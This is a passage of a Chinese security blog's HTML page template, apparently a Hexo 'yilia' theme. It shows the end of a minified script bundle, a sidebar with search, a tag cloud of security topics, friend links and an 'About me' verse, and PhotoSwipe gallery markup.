attempt")},delegateYield:function(t,n,r){return this.delegate={iterator:d(t),resultName:n,nextLoc:r},"next"===this.method&&(this.arg=g),A}}}("object"==typeof n?n:"object"==typeof window?window:"object"==typeof self?self:this)}).call(n,function(){return this}(),r(158))}])</script><script src="/./main.0cf68a.js"></script><script>!function(){!function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}("/slider.e37972.js")}()</script>


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
      
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">文章搜搜</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友情链接</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">About me</a></li>
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">安全</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">信息收集</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">随记</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">dnslog</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">社会工程</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">暗网</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">经验</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">json</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">elk</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">爆破</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">msf</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">fastjson</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">fortify</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">fortify速查</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">速查</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            3、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: false
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="http://blog.sina.com.cn/s/articlelist_1874551935_0_1.html" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>本人新浪博客</a>
            </li>
          
            <li class="search-li">
              <a href="https://yangrz.github.io/blog/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>y1r0nz技术博客</a>
            </li>
          
        </ul>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me" q-show="aboutme">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">一小小幽灵&lt;br&gt;潜伏在黑暗中&lt;br&gt;而自误自乐，&lt;br&gt;偶尔享受音乐，&lt;br&gt;偶尔研究技术，&lt;br&gt;偶尔静静发呆。</div>
  	  	
    	</section>
    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>